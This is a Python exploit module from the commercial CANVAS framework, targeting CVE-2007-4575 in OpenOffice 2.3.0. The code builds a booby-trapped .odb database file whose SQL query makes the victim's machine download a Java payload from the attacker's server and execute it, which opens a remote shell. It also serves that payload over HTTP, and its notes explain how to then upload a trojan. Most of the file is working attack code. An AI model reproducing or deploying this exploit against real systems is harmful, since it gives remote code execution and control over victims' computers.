#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

#covers both angles
import sys
if "." not in sys.path:
    sys.path.append(".")
    
from exploitutils import *
from httpclientside import httpclientside
from struct import pack
from zipfile import *
from shutil import copy
from canvasengine import JAVASERVER

NAME="OpenOffice Database 2.3.0 Static Java Execution"
DESCRIPTION="A flaw in the java support over SQL queries allows an attacker to execute any static java method"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="OpenOffice"
DOCUMENTATION["Repeatability"]="Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"] = "CVE-2007-4575"
DOCUMENTATION["CVS URL"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4575"
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION["Date public"] = "12/05/2007"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"], ["Linux"] ]
PROPERTY['VERSION'] = [ ]
PROPERTY['DELIVERY']='HTTP'

NOTES="""
To test from Commandline (it needs fromcreatethread)
   bash-3.00$ ./commandlineInterface.py -v 8 -p 5555
   bash-3.00$ exploits/httpserver/httpserver.py -O singleexploit:ooo_230 -l 192.168.1.1 -p 8080 -d 5555

The HTTP server has two uses:
- serve the .odb exploit file
- serve the .jar file with the java shellcode (so if you're behind a proxy/firewall, you should open 
  the shell port (ex: 5555) and the web port (ex: 8080), both for inbound conexions.

To trigger the exploit you have to click on the tables button:

(This will...)
- open a crafted db query
- open a crafted db form (that open a crafted query)

The execute method of UnoLoader class should download the java shellcode through a http connection 
(the same you use to serve the .odb file) and execute it, dropping you a shell.

While the Java is executing and downloading, the Openoffice document will "freeze". You'll want to quickly
upload a MOSDEF trojan and then run that and exit from your JavaNode shell to unfreeze the target's OO.org
process.

To make the javanode.jar file we use gcj to compile the .class files and the jar commandline util as follows:
bash-3.00$ jar cvfm javanode.jar manifest javaNode.class javaNodeStarter.class

manifest file:
CUTCUTCUTCUTCUT
Manifest-Version: 1.0
Created-By: 0.95
Main-Class: javaNodeStarter
CUTCUTCUTCUTCUT

The Main-Class will be executed automatically.
"""

CHANGELOG="""

"""

DEBUGNOTES="""
the hsqldb SQL engine (the default engine of OpenOffice) allows the use of any static java method inside a query, ex:
select "java.lang.Math.sqrt"(9.0) from sometable

using the UnoLoader.execute static method, we can load a .jar file with our code inside and execute any java method.
From the docs:
public static void execute(URL base,
                           URL jar,
                           String[] arguments)
            throws IOException,
                   ClassNotFoundException,
                   NoSuchMethodException,
                   InvocationTargetException
    Executes a UNO JAR.
    Parameters:
        base - a base URL relative to which the URE JARs (jurt.jar, ridl.jar, etc.) can be found; must not be null.
        jar - the URL of a UNO JAR that specifies a Main-Class; must not be null.
        arguments - any arguments passed to the main method of the specified
        Main-Class of the given JAR jar; must not be null.

"""

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.setVersions()
        self.version=1
        self.name=NAME
        self.filename = "ooo_230.odb"
        self.mimetype = None
        return

    def neededListenerTypes(self):
        return [JAVASERVER]

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=("all versions",None)

    def run(self):
        self.makefile()
        
        return 1
    
    def make_odb(self,jar_base,jar_ip,jar_port,jar_file,javanode_port):
        """ Build the .odb file """
        arg1 = binstring("aced00057372000c6a6176612e6e65742e55524c962537361afce47203000849000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00014c0004686f737471007e00014c000870726f746f636f6c71007e00014c000372656671007e00014c000875736572496e666f71007e0001787066a06b54ffffffff74000074")
        arg1 += pack(">H", len(jar_base))
        arg1 += jar_base
        arg1 += binstring("71007e000374000466696c65707078")
        arg1 = cleanhexprint(arg1)
        
        arg2 = binstring("aced00057372000c6a6176612e6e65742e55524c962537361afce47203000849000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00014c0004686f737471007e00014c000870726f746f636f6c71007e00014c000372656671007e00014c000875736572496e666f71007e000178703c69d4ec0000")
        arg2 += pack(">H", jar_port)
        arg2 += "\x74"
        jar_ip_port = "%s:%s"%(jar_ip,jar_port)
        arg2 += pack(">H", len(jar_ip_port))
        arg2 += jar_ip_port
        arg2 += "\x74"
        arg2 += pack(">H", len(jar_file))
        arg2 += jar_file
        arg2 += "\x74"
        arg2 += pack(">H", len(jar_ip))
        arg2 += jar_ip
        arg2 += binstring("74000468747470707078")
        arg2 = cleanhexprint(arg2)
        
        arg3 = binstring("aced0005757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000274")
        arg3 += pack(">H", len(jar_ip))
        arg3 += jar_ip
        arg3 += "\x74"
        arg3 += pack(">H", len(str(javanode_port)))
        arg3 += str(javanode_port)
        arg3 = cleanhexprint(arg3)
        
        copy(os.path.join("Resources","base.odb"), self.filename)
        zip = ZipFile(self.filename,"a")

        zip.writestr("content.xml",zip.read("content.xml").replace("REPLACE1",arg1).replace("REPLACE2",arg2).replace("REPLACE3",arg3))
        zip.writestr("forms/Obj11/content.xml",zip.read("forms/Obj11/content.xml").replace("REPLACE1",arg1).replace("REPLACE2",arg2).replace("REPLACE3",arg3))
        zip.writestr("database/script",zip.read("database/script") + "select \"com.sun.star.lib.unoloader.UnoLoader.execute\"('%s','%s','%s') from \"test\"\n"%(arg1,arg2,arg3))
        zip.close()

    def makefile(self):
        jar_port=self.getarg("port")
        if jar_port == None:
            jar_port=self.parent.getarg("port")
        host=self.callback.ip
        javanode_port=self.callback.port
        javapath="/usr/share/java/openoffice/"
        
        self.make_odb(javapath,host,jar_port,"/javanode.jar",javanode_port)
        
        f = open(self.filename,"rb")
        odb = f.read()
        f.close()
        
        return odb
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        
        if ".jar" in clientheader.URL:
            f = open(os.path.join("Resources","javanode.jar"),"rb")
            sploitstring = f.read()
            f.close()
            h.addHeader("Content-Type","application/octet-stream")
        elif ".odb" in clientheader.URL:
            sploitstring = self.makefile()
            h.addHeader("Content-Type","application/vnd.oasis.opendocument.database")        
        else:
            #redirect to self
            self.log("redirecting to self")
            h.status="302"
            h.addHeader("Location",self.filename)
            h.addHeader("Content-Type","text/html")
            return h,b

        self.log("Sending %d bytes"%len(sploitstring))
        
        h.addHeader("Connection","close")
        b.setBody(sploitstring)
                    
        return h,b


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
